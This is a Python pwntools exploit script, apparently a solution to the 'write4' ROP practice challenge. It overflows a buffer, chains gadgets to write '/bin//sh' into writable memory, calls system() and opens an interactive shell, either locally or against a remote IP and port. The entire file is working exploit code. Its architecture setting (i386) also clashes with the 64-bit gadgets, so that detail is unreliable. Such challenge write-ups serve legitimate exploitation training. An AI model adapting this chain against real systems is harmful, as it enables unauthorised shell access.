#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./write4')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

mov_add = 0x0400820 # mov qword ptr [r14], r15 ; ret
pop2_add = 0x0400890 # pop r14 ; pop r15 ; ret
system_add = 0x04005E0
write_add = 0x00601050
pop_rdi_add = 0x0400893 # pop rdi ; ret
# z('b*0x0401A55\nc')

payload = 'A'*0x20+ p64(0)
payload += p64(pop2_add) + p64(write_add) + '/bin//sh' + p64(mov_add)
payload +=  p64(pop_rdi_add) + p64(write_add) + p64(system_add)

cn.recv()
print payload
cn.sendline(payload)


cn.interactive()
